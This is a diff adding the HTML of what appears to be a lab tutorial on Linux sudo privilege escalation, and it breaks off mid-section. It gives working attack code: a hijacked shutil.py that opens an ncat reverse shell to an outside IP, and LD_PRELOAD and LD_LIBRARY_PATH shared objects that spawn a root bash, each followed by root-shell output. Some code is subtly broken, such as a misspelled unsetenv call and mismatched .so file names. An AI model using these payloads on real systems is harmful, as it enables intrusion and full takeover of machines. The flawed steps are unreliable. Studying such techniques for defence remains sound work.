+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-setenv">Privilege Escalation via SETENV</h1>
+<p>This directive allows the user to <strong>set an environment variable</strong> while executing something:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install ncat
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Edit the sudo configuration file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo visudo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>/etc/sudoers</code> configuration:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user:	<span class="nv">ALL</span><span class="o">=(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/backup.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>List the current allowed programs and the default entries:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> user on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User user may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/backup.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create the directory and the script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo mkdir /opt/scripts <span class="o">&amp;&amp;</span> sudo vim /opt/scripts/backup.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add the following code to <code>/opt/scripts/backup.py</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">make_archive</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">src</span> <span class="o">=</span> <span class="s1">&#39;/home/user/Documents&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">dst</span> <span class="o">=</span> <span class="s1">&#39;/var/backups/user_documents&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">make_archive</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;gztar&#39;</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It turns out there is a path to exploit backup.py. As shown above, I can pass a $PYTHONPATH into sudo. So what is that variable? When a Python script calls import, it has a series of paths it checks for the module. I can see this with the sys module:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ python3 -c <span class="s2">&#34;import sys; print(&#39;\n&#39;.join(sys.path))&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/lib/python38.zip
+</span></span><span class="line"><span class="cl">/usr/lib/python3.8
+</span></span><span class="line"><span class="cl">/usr/lib/python3.8/lib-dynload
+</span></span><span class="line"><span class="cl">/usr/local/lib/python3.8/dist-packages
+</span></span><span class="line"><span class="cl">/usr/lib/python3/dist-packages
+</span></span><span class="line"><span class="cl">user@pwn:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>first empty line</code> is <strong>important</strong> - it is filled at runtime with the current directory of the script (so if the current user could write to <code>/dev/shm</code>, I could exploit it that way). On this system, $PYTHONPATH is currently empty:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ <span class="nb">echo</span> <span class="nv">$PYTHONPATH</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@pwn:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If I set it and run look at <code>sys.path</code> again, my addition is added:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ <span class="nb">export</span> <span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp
+</span></span><span class="line"><span class="cl">user@pwn:~$ python3 -c <span class="s2">&#34;import sys; print(&#39;\n&#39;.join(sys.path))&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/tmp
+</span></span><span class="line"><span class="cl">/usr/lib/python38.zip
+</span></span><span class="line"><span class="cl">/usr/lib/python3.8
+</span></span><span class="line"><span class="cl">/usr/lib/python3.8/lib-dynload
+</span></span><span class="line"><span class="cl">/usr/local/lib/python3.8/dist-packages
+</span></span><span class="line"><span class="cl">/usr/lib/python3/dist-packages
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This means that Python will first try to look in the current script directory, then <code>/tmp</code>, then the Python installs to try to load <code>shutil</code>. Now we could look for writable directories.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find / -type d -writable 2&gt;/dev/null <span class="p">|</span> grep -v -e <span class="s1">&#39;^/proc&#39;</span> -e <span class="s1">&#39;/run&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Generally, we can use <code>/tmp</code> or <code>/dev/shm</code> or any other directory that we have write permissions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">vi /tmp/shutil.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Set a reverse shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">make_archive</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ncat 10.10.10.14 1234 -e /bin/bash&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Execute the <code>backup.py</code> which will import our <code>shutil.py</code> file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo <span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp python3 /opt/scripts/backup.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Receive a connection as root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.10.14<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.146.131<span class="o">]</span> <span class="m">47812</span>
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-ld_preload">Privilege Escalation via LD_PRELOAD</h1>
+<p>The environment variable LD_PRELOAD can be used to specify the location of a shared object (.so) file. When this option is enabled, the shared object will be loaded first. We can run code as soon as the object is loaded by building a custom shared object and an <code>init()</code> function.</p>
+<p>Edit the <code>sudo</code> configuration file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo visudo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This configuration file will be configured as the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Defaults	env_reset
+</span></span><span class="line"><span class="cl">Defaults <span class="nv">env_keep</span><span class="o">+=</span>LD_PRELOAD
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>LD PRELOAD</code> will fail if the effective user ID differs from the genuine user ID. <code>Sudo</code> must use the <code>env_keep</code> option to retain the <code>LD PRELOAD</code> environment setting.</p>
+<p>List the current allowed programs and the default entries:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> user on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, <span class="nv">env_keep</span><span class="o">+=</span>LD_PRELOAD, <span class="nv">env_keep</span><span class="o">+=</span>LD_LIBRARY_PATH
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User user may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create a file (<code>preload.c</code>)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">vim ld_preload.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add the following code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">_init</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">unnsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span> <span class="c1">// The unsetenv() function deletes the variable name from the environment. If name does not exist in the environment, then the function succeeds, and the environment is unchanged.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// set SUID as root
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/bash -p&#34;</span><span class="p">);</span> <span class="c1">// spawn spawn using the SUID bit with (-p)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Compile <code>ld_preload.c</code> to <code>ld_preload.so</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc -fPIC -shared -nostartfiles -o /tmp/ld_preload.so ld_preload.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Set the <code>LD_PRELOAD</code> environment variable to the full path of the preload and run any permitted program using <code>sudo</code> as a result:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ sudo <span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/preload.so &lt;any_allowed_program&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This will elevate the user to UID 0:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo <span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/preload.so bash 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-ld_library_path">Privilege Escalation via LD_LIBRARY_PATH</h1>
+<p>The LD_LIBRARY_PATH environment variable specifies which directories should be examined first for shared libraries.</p>
+<p>Edit the sudo configuration file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo visudo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>/etc/sudoers</code> configuration:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Defaults	env_reset
+</span></span><span class="line"><span class="cl">Defaults <span class="nv">env_keep</span><span class="o">+=</span>LD_LIBRARY_PATH
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>List the current allowed programs and the default entries:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> user on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, <span class="nv">env_keep</span><span class="o">+=</span>LD_LIBRARY_PATH
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User user may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</span></span><span class="line"><span class="cl">user@pwn:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>ldd</code> command can be used to print a program&rsquo;s shared libraries (.so files):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ldd /usr/sbin/useradd
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007ffd25340000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libaudit.so.1 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libaudit.so.1 <span class="o">(</span>0x00007ff9af392000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libselinux.so.1 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libselinux.so.1 <span class="o">(</span>0x00007ff9af367000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libsemanage.so.1 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libsemanage.so.1 <span class="o">(</span>0x00007ff9af324000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007ff9af132000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libcap-ng.so.0 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libcap-ng.so.0 <span class="o">(</span>0x00007ff9af12a000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libpcre2-8.so.0 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libpcre2-8.so.0 <span class="o">(</span>0x00007ff9af09a000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libdl.so.2 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libdl.so.2 <span class="o">(</span>0x00007ff9af092000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007ff9af3f5000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libsepol.so.1 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libsepol.so.1 <span class="o">(</span>0x00007ff9aefe0000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libbz2.so.1.0 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libbz2.so.1.0 <span class="o">(</span>0x00007ff9aefcd000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libpthread.so.0 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libpthread.so.0 <span class="o">(</span>0x00007ff9aefaa000<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we construct a shared library with the same name and set LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead of the one utilized by the program.</p>
+<p>This will require some trial and error since some shared objects are used by the program and will result in an error like this one:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">vim libaudit.so.1.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The following code spawns a bash with UID, GID, and EUID as 0 (root):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">hijack</span><span class="p">()</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">hijack</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_LIBRARY_PATH&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/bash -p&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Compile the custom shared object with the same name as the one that we want to replace:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc -o libaudit.so.1 -shared -fPIC libaudit.so.1.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lastly, we will change the LD_LIBRARY_PATH to our current working directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>. /usr/sbin/useradd
+</span></span><span class="line"><span class="cl">/usr/sbin/useradd: symbol lookup error: /usr/sbin/useradd: undefined symbol: audit_open
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since this shared object has a function that is needed by the <code>/usr/sbin/useradd</code> binary we need to find another shared object that we can use, to do this just keep renaming our custom shared object file <code>libaudit.so.1.c</code> to names of others shared objects found with GNU linker command <code>ldd /usr/sbin/useradd</code>. After some trial and error, I found this one:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ mv libcap-ng.so.0 libpcre2-8.so.0
+</span></span><span class="line"><span class="cl">user@pwn:~$ sudo <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>. /usr/sbin/useradd <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The shared object is loaded and now we have a root shell.</p>
+<h1 id="privilege-escalation-via-shell-escape-sequences">Privilege Escalation via Shell Escape Sequences</h1>
+<p>Edit the sudo configuration file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo visudo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add this to the <code>/etc/sudoers</code> configuration:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
